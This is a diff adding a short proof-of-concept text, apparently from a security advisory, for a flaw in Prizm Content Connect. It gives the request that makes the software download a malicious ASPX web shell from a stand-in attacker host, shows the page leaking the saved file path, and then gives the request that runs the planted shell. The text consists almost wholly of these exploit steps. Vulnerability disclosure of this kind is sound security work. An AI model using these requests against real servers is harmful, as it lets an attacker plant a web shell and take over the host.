@@ -1,0 +1,19 @@
+Proof of concept
+
+First, the attacker causes the Prizm Content Connect software to download
+the malicious ASPX file:
+
+http://www.example.com/default.aspx?document=http://attacker.example.org/aspxshell.aspx
+
+The resulting page discloses the filename to which the ASPX file was
+downloaded, e.g.:
+
+Document Location: C:\Project\
+
+Full Document Path: C:\Project\ajwyfw45itxwys45fgzomrmv.aspx
+
+Temp Location: C:\tempcache\
+
+The attacker then requests the ASPX shell from the root of the website:
+
+http://www.example.com/ajwyfw45itxwys45fgzomrmv.aspx
